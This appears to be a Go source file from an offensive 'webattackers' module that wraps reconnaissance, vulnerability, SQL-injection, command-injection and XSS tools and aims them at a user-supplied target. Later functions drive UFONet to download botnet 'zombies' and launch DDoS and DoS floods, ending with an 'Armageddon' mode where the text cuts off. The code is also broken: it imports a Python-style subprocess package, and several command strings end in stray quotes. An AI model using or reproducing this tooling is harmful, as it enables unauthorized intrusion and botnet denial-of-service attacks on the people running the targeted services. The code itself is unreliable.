package webattackers

import (
    "os"
    "fmt"
    "bufio"
    "strings"
    "bcolors"
    "subprocess"
)

var (
 userInput    string
 userPort     string
 userTarget   string
 chosenTarget string
)

func WafW00f(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing waf scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`wafw00f -v -a %s`, userTarget); fmt.Println()
}

func DnsRecon(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing dns scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`dnsrecon -a -d %s`, userTarget); fmt.Println()
}

func SeekOlver(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing recon scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/seekolver/; python3 seekolver.py -v -r -k -cn -p 80 443 -te %s`, userTarget); fmt.Println()
}

func WhatWeb(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing tech scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`whatweb -a 3 -v %s`, userTarget); fmt.Println()
}

func TheHarvester(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing email recon on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`theHarvester -n -l 45 -b bing,yahoo,duckduckgo -r "1.1.1.1" -d %s`, userTarget); fmt.Println()
}

func ParamSpider(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing urls mine on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/paramspider/; python3 paramspider.py -s -d %s`, userTarget); fmt.Println()
}

func SslScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing ssl scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`sslscan --show-certificate --show-sigs --tlsall --verbose %s`, userTarget); fmt.Println()
}

func Gobuster(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing dir recon on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`gobuster dir vhost --debug --no-error --random-agent -w /root/.africana/africana-base/wordlists/content/big.txt -e -u %s`, userTarget); fmt.Println()
}

func Nuclei(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nuclei -u %s`, userTarget); fmt.Println()
}

func Nikto(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing 2nd vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nikto -ask no -Cgidirs all -Display 3 -host %s`, userTarget); fmt.Println()
}

func Bbot(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing 3rd vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly -t %s`, userTarget); fmt.Println()
}

func Uniscan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing 4th vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`uniscan -qweds -u %s`, userTarget); fmt.Println()
}

func SqlmapAuto(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing sql 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s`, userTarget); fmt.Println()
}

func SqlmapMan() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing man sql 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -wizard'`); fmt.Println()
}

func CommixAuto(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing command 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 -u %s`, userTarget); fmt.Println()
}

func CommixMan() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing man command 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 --wizard'`); fmt.Println()
}

func KatanaAuto(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing xss 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`katana -jc -kf all -c 5 -d 3 %s | httpx-toolkit -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav`, userTarget); fmt.Println()
}

func XsserAuto(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing 2nd xss 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`xsser -c 100 --Cl -u %s`, userTarget); fmt.Println()
}

func XsserMan() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing man xss 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`xsser -u --wizard'`); fmt.Println(); fmt.Println()
}

func NetTacker1(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing recon scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -m port_scan -t 100 -i %s `, userTarget); fmt.Println()
}

func NetTacker2(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing domain scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m subdomain_scan`, userTarget); fmt.Println()
}

func NetTacker3(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing admin finder scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m scan`, userTarget); fmt.Println()
}

func NetTacker4(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing info gathering on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m information_gathering -s`, userTarget); fmt.Println()
}

func NetTacker5(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m server_version_vuln`, userTarget); fmt.Println()
}

func NetTacker6(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing CVE scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m cve`, userTarget); fmt.Println()
}

func NetTacker7(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing critical scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m high_severity`, userTarget); fmt.Println()
}

func NetTacker8(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing intrusive scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s --profile all/results.txt`, userTarget); fmt.Println()
}

func NetTacker9() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched WebUI key: africana " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/nettacker/; python3 nettacker.py --start-api --api-access-key africana'`); fmt.Println()
}

func Jok3r1() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Installing tools in the toolbox" + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; /bin/bash install-all.sh'`); fmt.Println()
}

func Jok3r2() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Updating tools in the toolbox " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --update-all --auto'`); fmt.Println()
}

func Jok3r3() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Showing tools in the toolbox " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --show-all'`); fmt.Println()
}

func Jok3r4() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Showing supported products " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py info --services'`); fmt.Println()
}

func Jok3r5(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing avery fast-scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast`, userTarget); fmt.Println()
}

func Jok3r6(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing security checks on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, userTarget); fmt.Println()
}

func Jok3r7(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing critical scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, userTarget); fmt.Println()
}

func Jok3r8() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Showing results & scans " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -'`); fmt.Println()
}

func Jok3r9() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Cleaning results & scans " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py db "mission -d default"'`); fmt.Println()
}

func Osmedeus1() {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Updating Osmedeus & Runing diagnostics to checks " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean'`); fmt.Println()
}

func Osmedeus2(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing simple scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`osmedeus --nv scan -t %s`, userTarget); fmt.Println()
}

func Osmedeus3(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing dir & vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`osmedeus --nv scan -f vuln-and-dirb -t %s`, userTarget); fmt.Println()
}

func Osmedeus4(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "Full path: " + bcolors.DARKCYAN + "To your saved 🎯targets to be " + bcolors.RED + "attacked!!🚀" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🔮" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userTarget)
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing bulk scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`osmedeus scan -f vuln-and-dirb -T %s`, userTarget); fmt.Println()
}

func Osmedeus5(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing cloud scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s`, userTarget); fmt.Println()
}

func Osmedeus6(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing secret & vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s`, userTarget); fmt.Println()
}

func Osmedeus7(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Updating db before running vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`osmedeus scan --update-vuln -t %s`, userTarget); fmt.Println()
}

func Osmedeus8() {
    fmt.Printf(bcolors.BLUE  + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "Enter Port: " + bcolors.DARKCYAN + "To start your server on🌍" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "3333" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🔮" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userPort, _ := reader.ReadString('\n')
    userPort = strings.TrimSpace(userPort)
    if userPort == "" {
        userPort = "3333"
    }
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Started Osmedeusweb UI server on " + bcolors.RED + "localhost:%s", userPort + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`osmedeus server --port %s`, userPort); fmt.Println()
}

func Osmedeus9() {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Showing scanned osmedeus report list " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`osmedeus report list'`); fmt.Println()
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Pleas select a target to expand list" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🔮" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&chosenTarget)
    fmt.Printf(bcolors.RED + "\n(More results for = %s)", chosenTarget + bcolors.ENDC)
    subprocess.Popen(`osmedeus report view --static -t %s`, chosenTarget); fmt.Println()
}

func Ufonet1() {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Downloading list of bots from C.S " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet --download-zombies'`); fmt.Println()
}

func Ufonet2() {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Testing If all bots are alive & ready to launch " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -t botnet/zombies.txt'`); fmt.Println()
}

func Ufonet3(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched Palantir 3.14 on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"`, userTarget); fmt.Println()
}

func Ufonet4(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched Socking_waves (instant-knockout!) on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"`, userTarget); fmt.Println()
}

func Ufonet5(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched xcom-1 (only DDoS) on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"`, userTarget); fmt.Println()
}

func Ufonet6(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched xcom-2 (only DoS) on" + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, userTarget); fmt.Println()
}

func Ufonet7() {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched ufonet UI on http://localhost:9999 " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet --gui'`); fmt.Println()
}

func Ufonet8() {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Started Grider ufonet --grider  " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet --grider'`); fmt.Println()
}

func Ufonet9(userTarget string) {
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched Armageddon! with ALL! " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
